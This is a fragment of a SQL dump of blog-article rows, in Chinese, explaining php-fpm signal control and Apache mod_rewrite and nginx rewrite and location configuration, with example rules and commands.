(49, 49, '&lt;div id=&quot;sina_keyword_ad_area2&quot; class=&quot;articalContent  &quot;&gt;&lt;p style=&quot;line-height:normal&quot;&gt;&lt;span style=&quot;color:#000000&quot;&gt;&lt;span style=&quot;line-height:20px;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;php 5.3.3 下的php-fpm 不再支持 php-fpm &lt;br /&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;line-height:normal&quot;&gt;&lt;span style=&quot;color:#000000&quot;&gt;&lt;span style=&quot;line-height:20px;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;以前具有的 /usr/local/php/sbin/php-fpm(start|stop|reload)等命令，需要使用信号控制：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;line-height:normal&quot;&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;master进程可以理解以下信号&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;line-height:normal&quot;&gt;&lt;span style=&quot;color:#009900;line-height:normal;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;INT,TERM&lt;/span&gt;&lt;wbr&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt; &amp;nbsp; 立刻终止&lt;br style=&quot;line-height:normal&quot; /&gt;&lt;/span&gt;&lt;span style=&quot;color:#009900;line-height:normal;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;QUIT&lt;/span&gt;&lt;wbr&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt; &amp;nbsp; 平滑终止&lt;br style=&quot;line-height:normal&quot; /&gt;&lt;/span&gt;&lt;span style=&quot;color:#009900;line-height:normal;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;USR1&lt;/span&gt;&lt;wbr&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt; &amp;nbsp; 重新打开日志文件&lt;br style=&quot;line-height:normal&quot; /&gt;&lt;/span&gt;&lt;span style=&quot;color:#009900;line-height:normal;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;USR2&lt;/span&gt;&lt;wbr&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt; &amp;nbsp; 平滑重载所有worker进程并重新载入配置和二进制模块&lt;/span&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/p&gt;&lt;p style=&quot;line-height:normal&quot;&gt;&lt;br /&gt;&lt;/p&gt;&lt;p style=&quot;line-height:normal&quot;&gt;&lt;strong&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;示例：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;p style=&quot;line-height:normal&quot;&gt;&lt;br style=&quot;line-height:normal&quot; /&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;php-fpm 关闭：&lt;br style=&quot;line-height:normal&quot; /&gt;&lt;/span&gt;&lt;span style=&quot;color:#CC0000;line-height:normal;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;kill -INT `cat/usr/local/php/var/run/php-fpm.pid`&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;line-height:normal&quot;&gt;&lt;br style=&quot;line-height:normal&quot; /&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;php-fpm 重启：&lt;br style=&quot;line-height:normal&quot; /&gt;&lt;/span&gt;&lt;span style=&quot;color:#CC0000;line-height:normal;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;kill -USR2 `cat/usr/local/php/var/run/php-fpm.pid`&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;line-height:normal&quot;&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;查看php-fpm进程数：&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;line-height:normal&quot;&gt;&lt;span style=&quot;color:#FF9900;line-height:normal;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;ps aux | grep -c php-fpm&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386777954),
(50, 50, '&lt;div id=&quot;blog_content&quot; class=&quot;blog_content&quot;&gt;&lt;p&gt;&lt;span style=&quot;font-size:14px&quot;&gt;&lt;strong&gt;&lt;span style=&quot;font-size:16px;&quot;&gt;1、Rewrite规则简介：&lt;/span&gt; &lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;Rewirte主要的功能就是实现URL的跳转，它的正则表达式是基于Perl语言。可基于服务器级的(httpd.conf)和目录级的(.htaccess)两种方式。如果要想用到rewrite模块，必须先安装或加载rewrite模块。方法有两种一种是编译apache的时候就直接安装rewrite模块，别一种是编译apache时以DSO模式安装apache,然后再利用源码和apxs来安装rewrite模块。 &lt;br /&gt;基于服务器级的(httpd.conf)有两种方法，一种是在httpd.conf的全局下直接利用RewriteEngine on来打开rewrite功能;另一种是在局部里利用RewriteEngine on来打开rewrite功能,下面将会举例说明，需要注意的是,必须在每个virtualhost里用RewriteEngine on来打开rewrite功能。否则virtualhost里没有RewriteEngine on它里面的规则也不会生效。 &lt;br /&gt;基于目录级的(.htaccess),要注意一点那就是必须打开此目录的FollowSymLinks属性且在.htaccess里要声明RewriteEngine on。&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:14px&quot;&gt;&lt;strong&gt;&lt;span style=&quot;font-size:16px;&quot;&gt;2、举例说明： &lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;例一.下面是在一个虚拟主机里定义的规则。功能是把client请求的主机前缀不是www.alibaba.cn和70.40.213.183都跳转到主机前缀为&lt;span class=&quot;nobr&quot;&gt;&lt;a class=&quot;external-link&quot; href=&quot;http://www.alibaba.com/&quot;&gt;http://www.alibaba.com&lt;/a&gt;&lt;/span&gt;，避免相同内容的网页有多个指向的域名，如&lt;span class=&quot;nobr&quot;&gt;&lt;a class=&quot;external-link&quot; href=&quot;http://alibaba.com/&quot;&gt;http://alibaba.com&lt;/a&gt;&lt;/span&gt;。&lt;/p&gt;&lt;div class=&quot;quote_title&quot;&gt;写道&lt;/div&gt;&lt;div class=&quot;quote_div&quot;&gt;NameVirtualHost 70.40.213.183:80&lt;br /&gt;ServerAdmin duanxf@ alibaba.com&lt;br /&gt;DocumentRoot &amp;quot;/web&amp;quot;&lt;br /&gt;ServerName alibaba.com &lt;br /&gt;RewriteEngine on #打开rewirte功能&lt;br /&gt;RewriteCond %{HTTP_HOST} !^www.alibaba.com [NC] #声明Client请求的主机中前缀不是www.alibaba.com，其中 [NC] 的意思是忽略大小写&lt;br /&gt;RewriteCond %{HTTP_HOST}!^70.40.213.183 [NC] #声明Client请求的主机中前缀不是70.40.213.183，其中 [NC] 的意思是忽略大小写&lt;br /&gt;RewriteCond %{HTTP_HOST} !^$ #声明Client请求的主机中前缀不为空&lt;br /&gt;&lt;p&gt;RewriteRule ^(.*) http://www.alibaba.com/ [L] #含义是如果Client请求的主机中的前缀符合上述条件，则直接进行跳转到http://www.alibaba.com/,[L]意味着立即停止重写操作，并不再应用其他重写规则。这里的.*是指匹配所有URL中不包含换行字符，()括号的功能是把所有的字符做一个标记，以便于后面的应用.就是引用前面里的(.*)字符。&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt; &lt;/p&gt;&lt;/div&gt;&lt;p&gt;&lt;span style=&quot;font-size:14px&quot;&gt;&lt;strong&gt;&lt;span style=&quot;font-size:16px;&quot;&gt;3.Apache mod_rewrite规则重写的标志一览 &lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;1) R[=code](force redirect) 强制外部重定向&lt;/p&gt;&lt;p&gt;强制在替代字符串加上http://thishost[:thisport]/前缀重定向到外部的URL.如果code不指定，将用缺省的302 HTTP状态码。&lt;/p&gt;&lt;p&gt;2) F(force URL to be forbidden)禁用URL,返回403HTTP状态码。&lt;/p&gt;&lt;p&gt;3) G(force URL to be gone) 强制URL为GONE，返回410HTTP状态码。&lt;/p&gt;&lt;p&gt;4) P(force proxy) 强制使用代理转发。&lt;/p&gt;&lt;p&gt;5) L(last rule) 表明当前规则是最后一条规则，停止分析以后规则的重写。&lt;/p&gt;&lt;p&gt;6) N(next round) 重新从第一条规则开始运行重写过程。&lt;/p&gt;&lt;p&gt;7) C(chained with next rule) 与下一条规则关联 &lt;br /&gt;如果规则匹配则正常处理，该标志无效，如果不匹配，那么下面所有关联的规则都跳过。 &lt;br /&gt;8) T=MIME-type(force MIME type) 强制MIME类型&lt;/p&gt;&lt;p&gt;9) NS (used only if no internal sub-request) 只用于不是内部子请求&lt;/p&gt;&lt;p&gt;10) NC(no case) 不区分大小写&lt;/p&gt;&lt;p&gt;11) QSA(query string append) 追加请求字符串&lt;/p&gt;&lt;p&gt;12) NE(no URI escaping of output) 不在输出转义特殊字符&lt;/p&gt;&lt;p&gt;例如：RewriteRule /foo/(.*) /bar?arg=P1%3d$1 [R,NE] 将能正确的将/foo/zoo转换成/bar?arg=P1=zoo&lt;/p&gt;&lt;p&gt;13) PT(pass through to next handler) 传递给下一个处理&lt;/p&gt;&lt;p&gt;例如：&lt;/p&gt;&lt;p&gt;RewriteRule ^/abc(.*) /def$1 [PT] # 将会交给/def规则处理&lt;/p&gt;&lt;p&gt;Alias /def /ghi&lt;/p&gt;&lt;p&gt;14) S=num(skip next rule(s)) 跳过num条规则&lt;/p&gt;&lt;p&gt;15) E=VAR:VAL(set environment variable) 设置环境变量 &lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;span style=&quot;font-size:12px&quot;&gt;&lt;strong&gt;&lt;span style=&quot;font-size:16px;&quot;&gt;URL重定向 &lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;例子一:&lt;/p&gt;&lt;p&gt;同时达到下面两个要求：&lt;/p&gt;&lt;p&gt;1.用&lt;span class=&quot;nobr&quot;&gt;&lt;a class=&quot;external-link&quot; href=&quot;http://www.alibaba.com/home.html&quot;&gt;http://www.alibaba.com/home.html&lt;sup&gt;&lt;img src=&quot;http://b2b-doc.alibaba-inc.com/images/icons/linkext7.gif&quot; class=&quot;rendericon&quot; height=&quot;7&quot; width=&quot;7&quot; /&gt;&lt;/sup&gt;&lt;/a&gt;&lt;/span&gt; 来访问 &lt;span class=&quot;nobr&quot;&gt;&lt;a class=&quot;external-link&quot; href=&quot;http://www.alibaba.com/home/&quot;&gt;http://www.alibaba.com/home/&lt;sup&gt;&lt;img src=&quot;http://b2b-doc.alibaba-inc.com/images/icons/linkext7.gif&quot; class=&quot;rendericon&quot; height=&quot;7&quot; width=&quot;7&quot; /&gt;&lt;/sup&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;2.用&lt;span class=&quot;nobr&quot;&gt;&lt;a class=&quot;external-link&quot; href=&quot;http://powercctv.alibaba.com/&quot;&gt;http://powercctv.alibaba.com&lt;sup&gt;&lt;img src=&quot;http://b2b-doc.alibaba-inc.com/images/icons/linkext7.gif&quot; class=&quot;rendericon&quot; height=&quot;7&quot; width=&quot;7&quot; /&gt;&lt;/sup&gt;&lt;/a&gt;&lt;/span&gt; 来访问&lt;span class=&quot;nobr&quot;&gt;&lt;a class=&quot;external-link&quot; href=&quot;http://www.aliaba.com/user.html?username=powercctv&quot;&gt;http://www.aliaba.com/user.html?username=powercctv&lt;sup&gt;&lt;img src=&quot;http://b2b-doc.alibaba-inc.com/images/icons/linkext7.gif&quot; class=&quot;rendericon&quot; height=&quot;7&quot; width=&quot;7&quot; /&gt;&lt;/sup&gt;&lt;/a&gt;&lt;/span&gt; 的功能 &lt;/p&gt;&lt;div class=&quot;quote_title&quot;&gt;写道&lt;/div&gt;&lt;div class=&quot;quote_div&quot;&gt;RewriteEngine On&lt;br /&gt;RewriteCond %{HTTP_HOST}&lt;br /&gt;^www.alibaba.com&lt;br /&gt;RewriteCond %{REQUEST_URI} !^home.html$&lt;br /&gt;RewriteCond %{REQUEST_URI}.html$&lt;br /&gt;RewriteRule (.*).html$ [http://www.alibaba.com/$1/] [R]&lt;br /&gt;RewriteCond %{HTTP_HOST} !^www.alibaba.com&lt;br /&gt;RewriteRule ^(.+) %{HTTP_HOST}[C]&lt;br /&gt;RewriteRule ^([^.]+).aliaba.com [http://www.alibaba.com/user.html?username=$1]&lt;/div&gt;&lt;p&gt;例子2:&lt;/p&gt;&lt;p&gt;冒号问题。&lt;/p&gt;&lt;p&gt;假如：我们的url有冒号，这就比较痛苦了。通常的url跳转整个匹配遇到冒号是会有问题的。因为我们的url含有冒号开头。这个时候就需要采用rewritecond进行匹配。&lt;/p&gt;&lt;div class=&quot;quote_title&quot;&gt;写道&lt;/div&gt;&lt;div class=&quot;quote_div&quot;&gt;RewriteCond %{QUERY_STRING} ^action=mcweb:(.*)&lt;br /&gt;RewriteRule ^/mcweb/contact.htm(.*)$ ${message_alibaba_com}/msgsend/contact.htm?action=%1 [L,R,NE]&lt;/div&gt;&lt;p&gt; Apache的跳转如果不加任何说明他会把匹配到的字符串后面的参数全部加到新跳转的URL上面。比如上面,所有跳转到mcweb/contact.htm这个链接问号后面的参数和&lt;/p&gt;&lt;p&gt;&lt;code class=&quot;java plain&quot;&gt;RewriteCond %{QUERY_STRING} ^action=mcweb:-( .*)&lt;/code&gt;&lt;/p&gt;&lt;div class=&quot;quote_title&quot;&gt;写道&lt;/div&gt;&lt;div class=&quot;quote_div&quot;&gt;RewriteCond %{QUERY_STRING} ^action=mcweb:-( .*)&lt;/div&gt;&lt;p&gt; 进行匹配，如果发现雷同，则跳转到message.alibaba.com/msgsend/contact.htm?action= 的后面%1就是匹配到的之后相同的字符串。如果有多个则多来几个(.*) %n就可以了&lt;br /&gt;Apache的rewrite跳转还有先后顺序，如果我想^/mcweb/contact.htm(.*)$包含mcweb在内的所有访问contact.htm全部跳转到/msgsend/contact.htm &amp;nbsp;同时所有的action=mcweb: 这样的url也都跳转到&lt;/p&gt;&lt;div class=&quot;quote_title&quot;&gt;写道&lt;/div&gt;&lt;div class=&quot;quote_div&quot;&gt;message.alibaba.com/msgsend/contact.htm?action= 这个url，那么需要在这个配置后面加一行：&lt;br /&gt;RewriteRule ^/mcweb/contact.htm ${message_alibaba_com}/msgsend/contact.htm [L,R,NE]&lt;/div&gt;&lt;p&gt; 如果我们匹配的时候只需要匹配冒号：那就比较简单了&lt;/p&gt;&lt;div class=&quot;quote_title&quot;&gt;写道&lt;/div&gt;&lt;div class=&quot;quote_div&quot;&gt;RewriteRule ^wiki/(.*:.*) wiki/index.php?title=$1 [L]&lt;/div&gt;&lt;/div&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386778127);
INSERT INTO `la_article` (`id`, `archiveid`, `content`, `updatetime`) VALUES
(51, 51, '&lt;p&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;Location语法语法：location [=|~|~*|^~] /uri/ { &hellip; }&lt;/span&gt;&lt;br /&gt;&lt;br /&gt;location = / {&lt;br /&gt;# 只匹配 / 查询。&lt;br /&gt;[ configuration A ]&lt;br /&gt;}&lt;br /&gt;&lt;br /&gt;location / {&lt;br /&gt;# 匹配任何查询，因为所有请求都已 / 开头。但是正则表达式规则和长的块规则将被优先和查询匹配。&lt;br /&gt;[ configuration B ]&lt;br /&gt;}&lt;br /&gt;&lt;br /&gt;location ^~ /images/ {&lt;br /&gt;# 匹配任何已 /images/ 开头的任何查询并且停止搜索。任何正则表达式将不会被测试。&lt;br /&gt;[ configuration C ]&lt;br /&gt;}&lt;br /&gt;&lt;br /&gt;location ~* .(gif|jpg|jpeg)$ {&lt;br /&gt;# 不区分大小写匹配任何已 gif、jpg 或 jpeg 结尾的请求。然而所有 /images/ 目录的请求将使用 Configuration C。&lt;br /&gt;[ configuration D ]&lt;br /&gt;}&lt;br /&gt;&lt;strong&gt;&lt;br /&gt;正则表达式匹配，其中：&lt;/strong&gt;&lt;/p&gt;&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol class=&quot;hl-main ln-show list-paddingleft-2&quot; title=&quot;Double click to hide line number.&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;&lt;p&gt;* ~ 为区分大小写匹配&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;* ~* 为不区分大小写匹配&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;* !~和!~*分别为区分大小写不匹配及不区分大小写不匹配&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;文件及目录匹配，其中：&lt;/strong&gt;&lt;/p&gt;&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol class=&quot;hl-main ln-show list-paddingleft-2&quot; title=&quot;Double click to hide line number.&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;&lt;p&gt;* -f和!-f用来判断是否存在文件&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;* -d和!-d用来判断是否存在目录&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;* -e和!-e用来判断是否存在文件或目录&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;* -x和!-x用来判断文件是否可执行&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;flag标记有：&lt;/strong&gt;&lt;/p&gt;&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol class=&quot;hl-main ln-show list-paddingleft-2&quot; title=&quot;Double click to hide line number.&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;&lt;p&gt;* last 相当于Apache里的[L]标记，表示完成rewrite&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;* break 终止匹配, 不再匹配后面的规则&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;* redirect 返回302临时重定向 地址栏会显示跳转后的地址&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;* permanent 返回301永久重定向 地址栏会显示跳转后的地址&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;一些可用的全局变量有，可以用做条件判断(待补全)&lt;/strong&gt;&lt;/p&gt;&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol class=&quot;hl-main ln-show list-paddingleft-2&quot; title=&quot;Double click to hide line number.&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;&lt;p&gt;$args&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;$content_length&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;$content_type&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;$document_root&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;$document_uri&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;$host&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;$http_user_agent&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;$http_cookie&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;$limit_rate&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;$request_body_file&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;$request_method&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;$remote_addr&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;$remote_port&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;$remote_user&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;$request_filename&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;$request_uri&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;$query_string&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;$scheme&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;$server_protocol&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;$server_addr&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;$server_name&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;$server_port&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;$uri&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;结合QeePHP的例子&lt;/strong&gt;&lt;/p&gt;&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol class=&quot;hl-main ln-show list-paddingleft-2&quot; title=&quot;Double click to hide line number.&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;&lt;p&gt;if (!-d $request_filename) {&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;rewrite ^/([a-z-A-Z]+)/([a-z-A-Z]+)/?(.*)$ /index.php?namespace=user&amp;amp;amp;controller=$1&amp;amp;amp;action=$2&amp;amp;amp;$3 last;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;rewrite ^/([a-z-A-Z]+)/?$ /index.php?namespace=user&amp;amp;amp;controller=$1 last;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;break;&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;多目录转成参数&lt;/strong&gt;&lt;br /&gt;abc.domian.com/sort/2 =&amp;gt; abc.domian.com/index.php?act=sort&amp;amp;name=abc&amp;amp;id=2&lt;/p&gt;&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol class=&quot;hl-main ln-show list-paddingleft-2&quot; title=&quot;Double click to hide line number.&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;&lt;p&gt;if ($host ~* (.*).domain.com) {&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;set $sub_name $1; &lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;rewrite ^/sort/(d+)/?$ /index.php?act=sort&amp;amp;cid=$sub_name&amp;amp;id=$1 last;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;}&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;目录对换&lt;/strong&gt;&lt;br /&gt;/123456/xxxx -&amp;gt; /xxxx?id=123456&lt;/p&gt;&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol class=&quot;hl-main ln-show list-paddingleft-2&quot; title=&quot;Double click to hide line number.&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;&lt;p&gt;rewrite ^/(d+)/(.+)/ /$2?id=$1 last;&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;例如下面设定nginx在用户使用ie的使用重定向到/nginx-ie目录下：&lt;/strong&gt;&lt;/p&gt;&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol class=&quot;hl-main ln-show list-paddingleft-2&quot; title=&quot;Double click to hide line number.&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;&lt;p&gt;if ($http_user_agent ~ MSIE) {&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;rewrite ^(.*)$ /nginx-ie/$1 break;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;}&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;目录自动加&ldquo;/&rdquo;&lt;/strong&gt;&lt;/p&gt;&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol class=&quot;hl-main ln-show list-paddingleft-2&quot; title=&quot;Double click to hide line number.&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;&lt;p&gt;if (-d $request_filename){&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;rewrite ^/(.*)([^/])$ http://$host/$1$2/ permanent;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;}&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;禁止htaccess&lt;/strong&gt;&lt;/p&gt;&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol class=&quot;hl-main ln-show list-paddingleft-2&quot; title=&quot;Double click to hide line number.&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;&lt;p&gt;location ~/.ht {&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;deny all;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;}&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;禁止多个目录&lt;/strong&gt;&lt;/p&gt;&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol class=&quot;hl-main ln-show list-paddingleft-2&quot; title=&quot;Double click to hide line number.&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;&lt;p&gt;location ~ ^/(cron|templates)/ {&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;deny all;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;break;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;}&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;禁止以/data开头的文件&lt;/strong&gt;&lt;br /&gt;可以禁止/data/下多级目录下.log.txt等请求;&lt;/p&gt;&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol class=&quot;hl-main ln-show list-paddingleft-2&quot; title=&quot;Double click to hide line number.&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;&lt;p&gt;location ~ ^/data {&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;deny all;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;}&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;禁止单个目录&lt;/strong&gt;&lt;br /&gt;不能禁止.log.txt能请求&lt;/p&gt;&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol class=&quot;hl-main ln-show list-paddingleft-2&quot; title=&quot;Double click to hide line number.&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;&lt;p&gt;location /searchword/cron/ {&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;deny all;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;}&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;禁止单个文件&lt;/strong&gt;&lt;/p&gt;&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol class=&quot;hl-main ln-show list-paddingleft-2&quot; title=&quot;Double click to hide line number.&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;&lt;p&gt;location ~ /data/sql/data.sql {&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;deny all;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;}&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt;&lt;p style=&quot;font-weight:bold&quot;&gt;根据文件类型expires&lt;/p&gt;&lt;p&gt;&lt;strong&gt;# Add expires header for static content&lt;br /&gt;&lt;span style=&quot;font-weight:normal&quot;&gt;location ~* .(js|css|jpg|jpeg|gif|png|swf)$ {&lt;/span&gt;&lt;br style=&quot;font-weight:normal&quot; /&gt;&lt;span style=&quot;font-weight:normal&quot;&gt; &amp;nbsp; &amp;nbsp;if (-f $request_filename) {&lt;/span&gt;&lt;br style=&quot;font-weight:normal&quot; /&gt;&lt;span style=&quot;font-weight:normal&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; root /data/www/wwwroot/bbs;&lt;/span&gt;&lt;br style=&quot;font-weight:normal&quot; /&gt;&lt;span style=&quot;font-weight:normal&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; expires &amp;nbsp; &amp;nbsp; &amp;nbsp;1d;&lt;/span&gt;&lt;br style=&quot;font-weight:normal&quot; /&gt;&lt;span style=&quot;font-weight:normal&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; break;&lt;/span&gt;&lt;br style=&quot;font-weight:normal&quot; /&gt;&lt;span style=&quot;font-weight:normal&quot;&gt; &amp;nbsp; &amp;nbsp;}&lt;/span&gt;&lt;br style=&quot;font-weight:normal&quot; /&gt;&lt;span style=&quot;font-weight:normal&quot;&gt;}&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;p style=&quot;font-weight:bold&quot;&gt;根据判断某个目录&lt;/p&gt;&lt;p&gt;&lt;strong&gt;&lt;span style=&quot;font-weight:normal&quot;&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;# serve static files&lt;/span&gt;&lt;br /&gt;location ~ ^/(images|javascript.|js|css|flash|media|static)/ {&lt;br /&gt;root &amp;nbsp; &amp;nbsp;/data/www/wwwroot/down;&lt;br /&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;expires 30d;&lt;br /&gt;}&lt;/span&gt;&lt;br 